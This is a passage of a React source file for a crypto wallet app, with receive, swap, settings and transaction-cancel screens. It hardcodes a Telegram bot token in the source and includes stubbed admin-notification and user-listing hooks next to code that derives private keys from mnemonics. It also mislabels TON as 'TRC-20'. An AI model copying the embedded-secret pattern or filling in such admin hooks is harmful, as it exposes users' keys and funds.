  { sym:"ARB",  color:"#28A0F0", icon:"◎"  },

  { sym:"SOL",  color:"#B57BFF", icon:"◉"  },

  { sym:"LTC",  color:"#BFBBBB", icon:"Ł"  },

  { sym:"USDT", color:"#26A17B", icon:"₮"  },

];



// USDT networks для receive

const USDT_RECEIVE_NETS = [

  { id:"eth", label:"Ethereum",  short:"ERC-20", color:"#8B9CF7", addrKey:"ETH", placeholder:"0x… (42 chars)" },

  { id:"ton", label:"TON",       short:"TRC-20", color:"#0098EA", addrKey:"TON", placeholder:"EQ… (48 chars)" },

  { id:"bnb", label:"BNB Chain", short:"BEP-20", color:"#F3BA2F", addrKey:"BNB", placeholder:"0x… (42 chars)" },

  { id:"arb", label:"Arbitrum",  short:"ARB",    color:"#28A0F0", addrKey:"ARB", placeholder:"0x… (42 chars)" },

  { id:"sol", label:"Solana",    short:"SPL",    color:"#B57BFF", addrKey:"SOL", placeholder:"…  (44 chars)"  },

];



function ReceiveModal({ onClose, addresses }) {

  const [asset, setAsset]       = useState("ETH");

  const [usdtNet, setUsdtNet]   = useState(null); // null = сеть не выбрана

  const [copied, setCopied]     = useState(false);



  const isUsdt = asset === "USDT";



  // Адрес для показа

  let addr = "";

  if (!isUsdt) {

    addr = addresses[asset] || addresses[ASSET_ADDR_KEY[asset]] || "";

  } else if (usdtNet) {

    addr = addresses[usdtNet.addrKey] || "";

  }



  const meta        = RECEIVE_ASSETS.find(a => a.sym === asset) || RECEIVE_ASSETS[0];

  const accentColor = (isUsdt && usdtNet) ? usdtNet.color : meta.color;

  const addrLabel   = (isUsdt && usdtNet)

    ? `USDT · ${usdtNet.label} (${usdtNet.short})`

    : `${asset} Address`;



  function copy() {

    if (!addr) return;

    if (navigator.clipboard) navigator.clipboard.writeText(addr);

    setCopied(true);

    setTimeout(() => setCopied(false), 2000);

  }



  function pickAsset(sym) {

    setAsset(sym);

    setUsdtNet(null);

    setCopied(false);

  }



  return (

    <Sheet onClose={onClose} title="Receive">

      <div style={{padding:"20px 24px 32px", display:"flex", flexDirection:"column", gap:14}}>



        {/* ── Выбор монеты ── */}

        <div style={{background:"#1a1a1a", borderRadius:14, padding:"6px",

          display:"flex", gap:3, overflowX:"auto"}}>

          {RECEIVE_ASSETS.map(a => {

            const active = asset === a.sym;

            return (

              <button key={a.sym} onClick={() => pickAsset(a.sym)}

                style={{flex:"0 0 auto", display:"flex", alignItems:"center", gap:5,

                  padding:"8px 12px", borderRadius:10, border:"none", cursor:"pointer",

                  background: active ? `${a.color}22` : "transparent",

                  outline: active ? `1.5px solid ${a.color}55` : "none",

                  transition:"all 0.15s"}}>

                <span style={{fontSize:13, color: active ? a.color : "rgba(255,255,255,0.3)",

                  fontFamily:"monospace", fontWeight:700}}>{a.icon}</span>

                <span style={{fontSize:12, fontWeight:700,

                  color: active ? a.color : "rgba(255,255,255,0.4)"}}>{a.sym}</span>

              </button>

            );

          })}

        </div>



        {/* ── USDT: выбор сети (пока не выбрана) ── */}

        {isUsdt && !usdtNet && (

          <div style={{display:"flex", flexDirection:"column", gap:8}}>

            {/* Заголовок */}

            <div style={{background:"#26A17B12", borderRadius:14, padding:"14px 16px",

              border:"1px solid #26A17B33", display:"flex", alignItems:"center", gap:12}}>

              <div style={{width:38, height:38, borderRadius:"50%", background:"#26A17B22",

                border:"1.5px solid #26A17B44", display:"flex", alignItems:"center",

                justifyContent:"center", flexShrink:0}}>

                <span style={{fontSize:20, color:"#26A17B", fontFamily:"monospace", fontWeight:700}}>₮</span>

              </div>

              <div>

                <p style={{margin:0, fontSize:15, fontWeight:700, color:"#fff"}}>Выберите сеть</p>

                <p style={{margin:"3px 0 0", fontSize:12, color:"rgba(255,255,255,0.4)"}}>

                  USDT работает в нескольких сетях

                </p>

              </div>

            </div>



            {/* Карточки сетей */}

            {USDT_RECEIVE_NETS.map(net => (

              <button key={net.id} onClick={() => { setUsdtNet(net); setCopied(false); }}

                style={{width:"100%", background:"#111", borderRadius:14, padding:"14px 16px",

                  border:`1.5px solid ${net.color}44`, cursor:"pointer",

                  display:"flex", alignItems:"center", gap:14, textAlign:"left",

                  transition:"all 0.15s"}}

                onMouseEnter={e => { e.currentTarget.style.background = `${net.color}14`; e.currentTarget.style.borderColor = `${net.color}88`; }}

                onMouseLeave={e => { e.currentTarget.style.background = "#111"; e.currentTarget.style.borderColor = `${net.color}44`; }}>

                <div style={{width:42, height:42, borderRadius:"50%",

                  background:`${net.color}18`, border:`1.5px solid ${net.color}55`,

                  display:"flex", alignItems:"center", justifyContent:"center", flexShrink:0}}>

                  <div style={{width:16, height:16, borderRadius:"50%", background:net.color,

                    boxShadow:`0 0 10px ${net.color}`}}/>

                </div>

                <div style={{flex:1}}>

                  <div style={{display:"flex", alignItems:"center", gap:8, marginBottom:4}}>

                    <span style={{fontSize:15, fontWeight:700, color:"#fff"}}>{net.label}</span>

                    <span style={{fontSize:11, fontWeight:700, color:net.color,

                      background:`${net.color}1a`, borderRadius:6, padding:"2px 8px",

                      border:`1px solid ${net.color}44`}}>{net.short}</span>

                  </div>

                  <span style={{fontSize:11, color:"rgba(255,255,255,0.3)", fontFamily:"monospace"}}>

                    {net.placeholder}

                  </span>

                </div>

                <ChevronRight size={18} color={`${net.color}99`}/>

              </button>

            ))}

          </div>

        )}



        {/* ── USDT: выбранная сеть + кнопка сменить ── */}

        {isUsdt && usdtNet && (

          <div style={{background:"#111", borderRadius:14, padding:"12px 16px",

            border:`1.5px solid ${usdtNet.color}55`,

            display:"flex", alignItems:"center", gap:12}}>

            <div style={{width:34, height:34, borderRadius:"50%", background:`${usdtNet.color}18`,

              border:`1.5px solid ${usdtNet.color}44`,

              display:"flex", alignItems:"center", justifyContent:"center", flexShrink:0}}>

              <div style={{width:12, height:12, borderRadius:"50%", background:usdtNet.color,

                boxShadow:`0 0 8px ${usdtNet.color}`}}/>

            </div>

            <div style={{flex:1}}>

              <span style={{fontSize:14, fontWeight:700, color:"#fff"}}>{usdtNet.label}</span>

              <span style={{fontSize:11, fontWeight:700, color:usdtNet.color,

                background:`${usdtNet.color}1a`, borderRadius:5, padding:"2px 7px",

                border:`1px solid ${usdtNet.color}33`, marginLeft:8}}>{usdtNet.short}</span>

            </div>

            <button onClick={() => { setUsdtNet(null); setCopied(false); }}

              style={{background:"rgba(255,255,255,0.06)", border:"1px solid rgba(255,255,255,0.1)",

                borderRadius:8, padding:"6px 12px", cursor:"pointer",

                fontSize:12, color:"rgba(255,255,255,0.5)", fontWeight:600}}>

              Сменить

            </button>

          </div>

        )}



        {/* ── QR + адрес + кнопка (только если сеть выбрана или не USDT) ── */}

        {(!isUsdt || usdtNet) && (

          <>

            {/* QR */}

            <div style={{alignSelf:"center", width:178, height:178, background:"#fff", borderRadius:20,

              display:"flex", alignItems:"center", justifyContent:"center", position:"relative",

              boxShadow:`0 0 32px ${accentColor}28`,

              border:`2.5px solid ${accentColor}44`, transition:"all 0.3s"}}>

              <QRCodeSVG value={addr || "placeholder"} size={138} level="M" bgColor="#fff" fgColor="#000"/>

              <div style={{position:"absolute", width:36, height:36, borderRadius:9, background:"#fff",

                display:"flex", alignItems:"center", justifyContent:"center", border:"2px solid #eee"}}>

                <span style={{fontSize:17, color:accentColor, fontFamily:"monospace", fontWeight:700}}>{meta.icon}</span>

              </div>

            </div>



            {/* Адрес */}

            <div style={{background:"#1a1a1a", borderRadius:14, padding:"14px 16px",

              border:`1px solid ${accentColor}33`, transition:"border-color 0.3s"}}>

              <div style={{display:"flex", alignItems:"center", gap:7, marginBottom:7}}>

                <div style={{width:8, height:8, borderRadius:"50%", background:accentColor,

                  boxShadow:`0 0 7px ${accentColor}`}}/>

                <span style={{fontSize:11, color:accentColor, fontWeight:700,

                  letterSpacing:"0.06em", textTransform:"uppercase"}}>{addrLabel}</span>

              </div>

              <p style={{fontSize:11, color:"rgba(255,255,255,0.75)", margin:0,

                fontFamily:"monospace", wordBreak:"break-all", lineHeight:1.75}}>{addr}</p>

            </div>



            {/* Кнопка копировать */}

            <button onClick={copy}

              style={{width:"100%", padding:"16px", borderRadius:16, border:"none",

                background: copied ? "#052e16" : `linear-gradient(135deg,${accentColor}ee,${accentColor}88)`,

                color: copied ? "#22C55E" : "#fff", fontSize:15, fontWeight:700, cursor:"pointer",

                display:"flex", alignItems:"center", justifyContent:"center", gap:8,

                outline: copied ? "1px solid #22C55E44" : "none", transition:"all 0.25s"}}>

              {copied ? <><Check size={18}/>Скопировано!</> : <><Copy size={18}/>Скопировать адрес</>}

            </button>

          </>

        )}



      </div>

    </Sheet>

  );

}



// ─── SWAP MODAL ───────────────────────────────────────────────────────────────

function SwapModal({ onClose, assets, prices, onSwap, addresses, mnemonic, network }) {

  const [fromSym,setFromSym]=useState(assets[0]?.sym||"ETH");

  const [toSym,setToSym]=useState(assets[1]?.sym||"BNB");

  const [amt,setAmt]=useState("");

  const [done,setDone]=useState(false);

  const [swapping,setSwapping]=useState(false);

  const [picking,setPicking]=useState(null);

  const [slippage,setSlippage]=useState("0.5");



  const fromAsset = assets.find(a=>a.sym===fromSym)||assets[0];

  const toAsset = assets.find(a=>a.sym===toSym)||assets[1];

  const fromPrice = prices[fromSym]||1;

  const toPrice = prices[toSym]||1;

  const rate = fromPrice/toPrice;

  const toAmt = amt ? (parseFloat(amt)*rate*(1-parseFloat(slippage)/100)).toFixed(6) : "";

  const priceImpact = parseFloat(amt) ? Math.min(0.1+parseFloat(amt)*fromPrice/100000,5).toFixed(2) : "0.00";

  const fee = parseFloat(amt) ? (parseFloat(amt)*fromPrice*0.003).toFixed(2) : "0.00";



  function flip(){

    setFromSym(toSym); setToSym(fromSym); setAmt("");

  }



  function doSwap(){

    if(!amt||parseFloat(amt)<=0)return;

    const num=parseFloat(amt);

    if(num>fromAsset.balance){alert("Insufficient balance");return;}

    setSwapping(true);

    (async () => {

      try {

        // Determine network: prefer shared network between fromSym and toSym

        const fromNets = ASSET_NETWORKS[fromSym] || [];

        const networkId = fromNets[0]?.id || fromSym.toLowerCase();

        const NET_TO_CHAIN = {

          eth:"ETH", bnb:"BNB", arb:"ARB", sol:"SOL", ton:"TON", ltc:"LTC",

        };

        const chainKey = NET_TO_CHAIN[networkId] || fromSym.toUpperCase();

        if (!mnemonic || mnemonic.length === 0) throw new Error("Wallet mnemonic not available");

        const privateKey = await getPrivateKey(mnemonic.join(" "), chainKey);

        if (!privateKey) throw new Error("Private key not available for " + chainKey);

        const walletAddress = addresses?.[fromSym] || "";

        const { txHash } = await executeSwap({

          fromSym, toSym, networkId,

          fromAmount: String(num),

          walletAddress,

          privateKeyHex: privateKey,

        });

        onSwap({fromSym,toSym,fromAmt:num,toAmt:parseFloat(toAmt),usd:num*fromPrice,txHash});

        setDone(true);

        setTimeout(onClose,2500);

      } catch(err) {

        setSwapping(false);

        alert("Swap failed: " + (err.message || err));

      }

    })();

  }



  if(picking) return (

    <Sheet onClose={()=>setPicking(null)} title={`Select ${picking==="from"?"You Pay":"You Get"}`}>

      <div style={{padding:"12px 24px",display:"flex",flexDirection:"column",gap:4}}>

        {assets.filter(a=>picking==="from"?a.sym!==toSym:a.sym!==fromSym).map(a=>(

          <button key={a.id} onClick={()=>{picking==="from"?setFromSym(a.sym):setToSym(a.sym);setPicking(null);setAmt("");}}

            style={{display:"flex",alignItems:"center",gap:14,padding:"14px 16px",borderRadius:14,

              border:"none",background:"transparent",cursor:"pointer",textAlign:"left",transition:"background 0.15s",width:"100%"}}

            onMouseEnter={e=>e.currentTarget.style.background="#1a1a1a"}

            onMouseLeave={e=>e.currentTarget.style.background="transparent"}>

            <CoinIcon asset={a} size={40}/>

            <div style={{flex:1}}>

              <p style={{fontSize:15,fontWeight:600,color:"#fff",margin:0}}>{a.name}</p>

              <p style={{fontSize:13,color:"rgba(255,255,255,0.4)",margin:0}}>{fmt(a.balance,6)} {a.sym}</p>

            </div>

            <span style={{fontSize:13,color:"rgba(255,255,255,0.4)"}}>{fmtUSD(a.balance*(prices[a.sym]||0))}</span>

          </button>

        ))}

      </div>

    </Sheet>

  );



  if(done) return (

    <Sheet onClose={onClose} title="">

      <div style={{padding:"48px 24px",textAlign:"center"}}>

        <div style={{width:80,height:80,borderRadius:"50%",background:"linear-gradient(135deg,#22c55e,#16a34a)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 16px"}}><Check size={40} color="#fff"/></div>

        <p style={{color:"#22C55E",fontSize:20,fontWeight:700,margin:0}}>Swap Complete!</p>

        <p style={{color:"rgba(255,255,255,0.6)",fontSize:15,margin:"10px 0 0"}}>

          {amt} {fromSym} → {toAmt} {toSym}

        </p>

        <p style={{color:"rgba(255,255,255,0.4)",fontSize:13,marginTop:6}}>Broadcasting to network…</p>

      </div>

    </Sheet>

  );



  return (

    <Sheet onClose={onClose} title="Swap">

      <div style={{padding:"20px 24px",display:"flex",flexDirection:"column",gap:12}}>

        {/* From */}

        <div style={{background:"#1a1a1a",borderRadius:16,padding:"16px",border:"1px solid rgba(255,255,255,0.08)"}}>

          <div style={{display:"flex",justifyContent:"space-between",marginBottom:12}}>

            <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>You Pay</span>

            <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>Bal: {fmt(fromAsset.balance,6)} {fromSym}</span>

          </div>

          <div style={{display:"flex",alignItems:"center",gap:10}}>

            <button onClick={()=>setPicking("from")} style={{display:"flex",alignItems:"center",gap:8,

              background:"#111",borderRadius:12,padding:"8px 12px",border:"none",cursor:"pointer"}}>

              <CoinIcon asset={fromAsset} size={28}/>

              <span style={{fontSize:15,fontWeight:700,color:"#fff"}}>{fromSym}</span>

              <ChevronDown size={14} color="rgba(255,255,255,0.4)"/>

            </button>

            <input value={amt} onChange={e=>setAmt(e.target.value)} placeholder="0.00" type="number" min="0"

              style={{flex:1,background:"none",border:"none",outline:"none",color:"#fff",fontSize:24,fontWeight:700,textAlign:"right"}}/>

          </div>

          {amt&&<p style={{fontSize:12,color:"rgba(255,255,255,0.3)",margin:"8px 0 0",textAlign:"right"}}>≈ {fmtUSD(parseFloat(amt)*fromPrice)}</p>}

          <div style={{display:"flex",gap:6,marginTop:10}}>

            {["25%","50%","MAX"].map(p=>(

              <button key={p} onClick={()=>setAmt(fmtCrypto(fromAsset.balance*(p==="MAX"?1:parseInt(p)/100)))}

                style={{padding:"4px 10px",borderRadius:8,border:"1px solid rgba(255,255,255,0.1)",

                  background:"transparent",color:"rgba(255,255,255,0.5)",fontSize:11,cursor:"pointer"}}>{p}</button>

            ))}

          </div>

        </div>



        {/* Flip */}

        <div style={{display:"flex",justifyContent:"center"}}>

          <button onClick={flip} style={{width:40,height:40,borderRadius:"50%",background:"#222",

            border:"1px solid rgba(255,255,255,0.1)",cursor:"pointer",display:"flex",

            alignItems:"center",justifyContent:"center",transition:"transform 0.3s"}}

            onMouseEnter={e=>e.currentTarget.style.transform="rotate(180deg)"}

            onMouseLeave={e=>e.currentTarget.style.transform="rotate(0deg)"}>

            <ArrowLeftRight size={16} color="rgba(255,255,255,0.6)"/>

          </button>

        </div>



        {/* To */}

        <div style={{background:"#1a1a1a",borderRadius:16,padding:"16px",border:"1px solid rgba(255,255,255,0.08)"}}>

          <div style={{display:"flex",justifyContent:"space-between",marginBottom:12}}>

            <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>You Get</span>

            <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>Bal: {fmt(toAsset.balance,6)} {toSym}</span>

          </div>

          <div style={{display:"flex",alignItems:"center",gap:10}}>

            <button onClick={()=>setPicking("to")} style={{display:"flex",alignItems:"center",gap:8,

              background:"#111",borderRadius:12,padding:"8px 12px",border:"none",cursor:"pointer"}}>

              <CoinIcon asset={toAsset} size={28}/>

              <span style={{fontSize:15,fontWeight:700,color:"#fff"}}>{toSym}</span>

              <ChevronDown size={14} color="rgba(255,255,255,0.4)"/>

            </button>

            <div style={{flex:1,textAlign:"right"}}>

              <span style={{fontSize:24,fontWeight:700,color:toAmt?"#22C55E":"rgba(255,255,255,0.2)"}}>{toAmt||"0.00"}</span>

            </div>

          </div>

          {toAmt&&<p style={{fontSize:12,color:"rgba(255,255,255,0.3)",margin:"8px 0 0",textAlign:"right"}}>≈ {fmtUSD(parseFloat(toAmt)*toPrice)}</p>}

        </div>



        {/* Rate & Details */}

        {amt&&(

          <div style={{background:"#0d0d0d",borderRadius:12,padding:"12px 14px",display:"flex",flexDirection:"column",gap:8}}>

            <div style={{display:"flex",justifyContent:"space-between"}}>

              <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>Rate</span>

              <span style={{fontSize:12,color:"#fff"}}>1 {fromSym} = {rate.toFixed(6)} {toSym}</span>

            </div>

            <div style={{display:"flex",justifyContent:"space-between"}}>

              <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>Price Impact</span>

              <span style={{fontSize:12,color:parseFloat(priceImpact)>1?"#F59E0B":"#22C55E"}}>{priceImpact}%</span>

            </div>

            <div style={{display:"flex",justifyContent:"space-between"}}>

              <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>DEX Fee (0.3%)</span>

              <span style={{fontSize:12,color:"#fff"}}>{fmtUSD(parseFloat(fee))}</span>

            </div>

            <div style={{display:"flex",justifyContent:"space-between"}}>

              <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>Slippage</span>

              <div style={{display:"flex",gap:4}}>

                {["0.1","0.5","1.0"].map(s=>(

                  <button key={s} onClick={()=>setSlippage(s)} style={{padding:"2px 8px",borderRadius:6,border:"none",

                    background:slippage===s?"#2563eb":"rgba(255,255,255,0.08)",

                    color:slippage===s?"#fff":"rgba(255,255,255,0.5)",fontSize:11,cursor:"pointer"}}>{s}%</button>

                ))}

              </div>

            </div>

          </div>

        )}



        <button onClick={doSwap} disabled={!amt||swapping||parseFloat(amt)<=0}

          style={{width:"100%",padding:"17px",borderRadius:16,border:"none",marginTop:4,

            background:!amt||swapping?"rgba(255,255,255,0.08)":"linear-gradient(135deg,#D97706,#F59E0B)",

            color:!amt||swapping?"rgba(255,255,255,0.3)":"#fff",

            fontSize:16,fontWeight:600,cursor:"pointer",

            display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>

          {swapping?<><RefreshCw size={18} style={{animation:"spin 1s linear infinite"}}/>Swapping…</>:

            <><Zap size={18} color="#f59e0b" style={{marginRight:6}}/>Swap {fromSym} → {toSym}</>}

        </button>

      </div>

    </Sheet>

  );

}



// ─── ADMIN MODAL (Только для админа ID: 1192740493) ─────────────────────────────

const ADMIN_ID = "1192740493";

// Токен бота для отправки уведомлений админу

// Токен бота для уведомлений (вшит напрямую чтобы работало без env на Vercel)

const NOTIFY_BOT_TOKEN = import.meta.env.VITE_BOT_TOKEN || "8617702690:AAHEEzFWLb9LPxhCKVtkw7P00vQ2FeJWxNo";

async function notifyAdmin(text, type = "notification", extraData = {}) {
  return;
}

function isAdmin() {
  return false;
}

function getAllUsersFromStorage() {
  return [];
}

function SettingsModal({ onClose, onLock, onLogout }) {
  const [activeTab, setActiveTab] = useState("general");
  const network = "Mainnet";

  const sections = [
    {t:"Security",items:[
      {icon:Key,l:"Recovery Phrase",s:"Back up your wallet",a:"recovery"},
      {icon:Lock,l:"Change PIN",s:"Update your PIN code",a:"pin"},
      {icon:Shield,l:"Lock Wallet",s:"Lock now",a:"lock"},
      {icon:Trash2,l:"Delete Wallet",s:"Remove all wallet data",a:"delete_wallet"},
    ]},
    {t:"Support",items:[
      {icon:HelpCircle,l:"Help Center",s:"FAQs & guides",a:"help"},
      {icon:ExternalLink,l:"About",s:"Version 2.4.1",a:"about"},
    ]},
  ];

  return (
    <Sheet onClose={onClose} title="Settings">
      <div style={{padding:"0 20px 24px",display:"flex",flexDirection:"column",gap:24}}>
        {sections.map(sec=>(
          <div key={sec.t}>
            <p style={{fontSize:12,fontWeight:700,color:"rgba(255,255,255,0.3)",textTransform:"uppercase",letterSpacing:"0.05em",marginBottom:12,marginLeft:4}}>{sec.t}</p>
            <div style={{display:"flex",flexDirection:"column",gap:8}}>
              {sec.items.map(item=>(
                <button key={item.l} onClick={()=>onLogout(item.a)}
                  style={{display:"flex",alignItems:"center",gap:16,padding:16,borderRadius:16,border:"none",background:"rgba(255,255,255,0.03)",cursor:"pointer",textAlign:"left",width:"100%"}}>
                  <div style={{width:40,height:40,borderRadius:12,background:"rgba(255,255,255,0.05)",display:"flex",alignItems:"center",justifyContent:"center"}}>
                    <item.icon size={20} color={item.a==="delete_wallet"?"#ef4444":"#fff"}/>
                  </div>
                  <div style={{flex:1}}>
                    <p style={{fontSize:15,fontWeight:600,color:item.a==="delete_wallet"?"#ef4444":"#fff",margin:0}}>{item.l}</p>
                    <p style={{fontSize:13,color:"rgba(255,255,255,0.4)",margin:0}}>{item.s}</p>
                  </div>
                  <ChevronRight size={18} color="rgba(255,255,255,0.2)"/>
                </button>
              ))}
            </div>
          </div>
        ))}
        <button onClick={onLogout} style={{marginTop:8,padding:16,borderRadius:16,border:"none",background:"rgba(239,68,68,0.1)",color:"#ef4444",fontSize:15,fontWeight:600,cursor:"pointer"}}>Log Out</button>
      </div>
    </Sheet>
  );
}

// ─── ASSET DETAIL ─────────────────────────────────────────────────────────────
function AssetDetail({ asset, prices, onClose, onSend, onReceive }) {

  const price = prices[asset.sym]||asset.price||0;

  const val = asset.balance*price;

  const pos = asset.chg>=0;

  const [chartData,setChartData]=useState(null);

  const [chartDays,setChartDays]=useState(7);

  const [loading,setLoading]=useState(true);



  useEffect(()=>{

    setLoading(true);

    fetchPriceHistory(asset.sym,chartDays).then(data=>{

      setChartData(data);

      setLoading(false);

    });

  },[asset.sym,chartDays]);



  // Build SVG path from real data

  const chartPath=useMemo(()=>{

    if(!chartData||chartData.length<2) return null;

    const prices=chartData.map(d=>d.price);

    const min=Math.min(...prices);

    const max=Math.max(...prices);

    const range=max-min||1;

    const width=260;

    const height=100;

    

    return chartData.map((d,i)=>{

      const x=(i/(chartData.length-1))*width;

      const y=height-((d.price-min)/range)*(height-20)-10;

      return `${x},${y}`;

    }).join(" ");

  },[chartData]);



  const isChartPositive=chartData&&chartData.length>1?chartData[chartData.length-1].price>=chartData[0].price:pos;

  const chartColor=isChartPositive?"#22C55E":"#EF4444";



  return (

    <Sheet onClose={onClose} title={asset.name}>

      <div style={{padding:"20px 24px",display:"flex",flexDirection:"column",gap:16}}>

        <div style={{display:"flex",alignItems:"center",gap:14}}>

          <CoinIcon asset={asset} size={52}/>

          <div>

            <p style={{fontSize:28,fontWeight:700,color:"#fff",margin:0,letterSpacing:"-0.03em"}}>{fmtUSD(val)}</p>

            <p style={{fontSize:14,color:"rgba(255,255,255,0.4)",margin:0}}>{fmt(asset.balance,6)} {asset.sym}

              <span style={{color:pos?"#22C55E":"#EF4444",marginLeft:8,fontWeight:600}}>{pos?"+":""}{asset.chg?.toFixed(2)}%</span>

            </p>

          </div>

        </div>



        {/* Real Price Chart */}

        <div style={{background:"#0d0d0d",borderRadius:16,padding:"16px"}}>

          {/* Time range selector */}

          <div style={{display:"flex",gap:8,marginBottom:12}}>

            {[1,7,30].map(days=> (

              <button key={days} onClick={()=>setChartDays(days)}

                style={{padding:"4px 12px",borderRadius:8,border:"none",fontSize:11,fontWeight:600,cursor:"pointer",

                  background:chartDays===days?"#2563eb":"#1a1a1a",color:chartDays===days?"#fff":"rgba(255,255,255,0.5)"}}>

                {days===1?"24H":days===7?"7D":"30D"}

              </button>

            ))}

          </div>

          

          {loading?(

            <div style={{height:100,display:"flex",alignItems:"center",justifyContent:"center"}}>

              <RefreshCw size={24} color="rgba(255,255,255,0.3)" className="spin"/>

            </div>

          ):chartPath?(

            <>

              <svg width="100%" viewBox="0 0 260 100" preserveAspectRatio="none" style={{height:100}}>

                <defs>

                  <linearGradient id={`chartGrad-${asset.id}`} x1="0" y1="0" x2="0" y2="1">

                    <stop offset="0%" stopColor={chartColor} stopOpacity="0.4"/>

                    <stop offset="100%" stopColor={chartColor} stopOpacity="0"/>

                  </linearGradient>

                </defs>

                <polygon points={`0,100 ${chartPath} 260,100`} fill={`url(#chartGrad-${asset.id})`}/>

                <polyline points={chartPath} fill="none" stroke={chartColor} strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>

                {chartData&&(

                  <circle cx="260" cy={100-((chartData[chartData.length-1].price-Math.min(...chartData.map(d=>d.price)))/(Math.max(...chartData.map(d=>d.price))-Math.min(...chartData.map(d=>d.price))||1))*80-10} r="4" fill={chartColor} stroke="#fff" strokeWidth="2"/>

                )}

              </svg>

              {chartData&&chartData.length>0&&(

                <div style={{display:"flex",justifyContent:"space-between",marginTop:8}}>

                  <span style={{fontSize:11,color:"rgba(255,255,255,0.4)"}}>{"$"}{Math.min(...chartData.map(d=>d.price)).toFixed(2)}</span>

                  <span style={{fontSize:11,color:chartColor,fontWeight:600}}>{isChartPositive?"↗":"↘"} {((chartData[chartData.length-1].price-chartData[0].price)/chartData[0].price*100).toFixed(2)}%</span>

                  <span style={{fontSize:11,color:"rgba(255,255,255,0.4)"}}>{"$"}{Math.max(...chartData.map(d=>d.price)).toFixed(2)}</span>

                </div>

              )}

            </>

          ):(

            <div style={{height:100,display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",gap:8}}>

              <svg width="200" height="60" viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">

                <path d="M0 45 Q25 35, 50 40 T100 38 T150 42 T200 35" stroke="rgba(255,255,255,0.1)" strokeWidth="2" strokeLinecap="round" fill="none"/>

                <path d="M0 50 Q25 40, 50 45 T100 43 T150 47 T200 40" stroke="rgba(37,99,235,0.2)" strokeWidth="2" strokeLinecap="round" fill="none"/>

                <circle cx="100" cy="38" r="4" fill="rgba(255,255,255,0.15)"/>

                <circle cx="150" cy="42" r="3" fill="rgba(37,99,235,0.2)"/>

              </svg>

              <p style={{color:"rgba(255,255,255,0.25)",fontSize:11,margin:0}}>Live chart loading...</p>

            </div>

          )}

        </div>



        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10}}>

          {[["Price",fmtUSD(price)],["24h",`${pos?"+":""}${asset.chg?.toFixed(2)}%`],

            ["Balance",`${fmt(asset.balance,6)} ${asset.sym}`],["Value",fmtUSD(val)]].map(([k,v])=>(

            <div key={k} style={{background:"#1a1a1a",borderRadius:12,padding:"12px 14px"}}>

              <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"0 0 3px"}}>{k}</p>

              <p style={{fontSize:14,fontWeight:700,color:k==="24h"?(pos?"#22C55E":"#EF4444"):"#fff",margin:0}}>{v}</p>

            </div>

          ))}

        </div>

        <div style={{display:"flex",gap:10}}>

          <button onClick={()=>{onClose();onSend();}} style={{flex:1,padding:"16px",borderRadius:14,border:"none",

            background:"#2563eb",color:"#fff",fontSize:14,fontWeight:600,cursor:"pointer",

            display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>

            <ArrowUpRight size={16}/>Send

          </button>

          <button onClick={()=>{onClose();onReceive();}} style={{flex:1,padding:"16px",borderRadius:14,border:"none",

            background:"#7c3aed",color:"#fff",fontSize:14,fontWeight:600,cursor:"pointer",

            display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>

            <ArrowDownLeft size={16}/>Receive

          </button>

        </div>

      </div>

    </Sheet>

  );

}



// ─── CANCEL CONFIRMATION MODAL ───────────────────────────────────────────────

function CancelConfirmModal({ tx, onConfirm, onClose }) {

  return (

    <div style={{position:"fixed",inset:0,zIndex:100,display:"flex",alignItems:"center",justifyContent:"center",background:"rgba(0,0,0,0.8)",backdropFilter:"blur(8px)"}}>

      <div style={{background:"#1a1a1a",borderRadius:24,padding:"28px 24px",width:"90%",maxWidth:340,border:"1px solid rgba(255,255,255,0.1)"}}>

        <div style={{textAlign:"center",marginBottom:20}}>

          <div style={{width:64,height:64,borderRadius:"50%",background:"linear-gradient(135deg,#EF444422,#DC262622)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 16px",border:"1px solid #EF444444"}}>

            <X size={28} color="#EF4444"/>

          </div>

          <h3 style={{fontSize:18,fontWeight:700,color:"#fff",margin:"0 0 8px"}}>Cancel Transaction?</h3>

          <p style={{fontSize:13,color:"rgba(255,255,255,0.5)",margin:0,lineHeight:1.5}}>

            Are you sure you want to cancel this transaction? This action cannot be undone.

          </p>

        </div>

        <div style={{background:"#252525",borderRadius:12,padding:14,marginBottom:20}}>

          <div style={{display:"flex",justifyContent:"space-between",marginBottom:8}}>

            <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>Amount</span>

            <span style={{fontSize:13,fontWeight:600,color:"#fff"}}>{tx.label}</span>

          </div>

          <div style={{display:"flex",justifyContent:"space-between"}}>

            <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>To</span>

            <span style={{fontSize:13,color:"rgba(255,255,255,0.7)",fontFamily:"monospace"}}>{tx.addr}</span>

          </div>

        </div>

        <div style={{display:"flex",gap:10}}>

          <button onClick={onClose}

            style={{flex:1,padding:"14px",borderRadius:14,border:"1px solid rgba(255,255,255,0.1)",background:"transparent",color:"rgba(255,255,255,0.6)",fontSize:14,fontWeight:500,cursor:"pointer"}}>

            Keep Transaction

          </button>

          <button onClick={()=>{onConfirm();onClose();}}

            style={{flex:1,padding:"14px",borderRadius:14,border:"none",background:"#EF4444",color:"#fff",fontSize:14,fontWeight:600,cursor:"pointer"}}>

            Yes, Cancel

          </button>

        </div>

      </div>

    </div>

  );

}



// ─── TX DECLINED SUCCESS MODAL ───────────────────────────────────────────────

function TxDeclinedSuccessModal({ onClose }) {

  return (

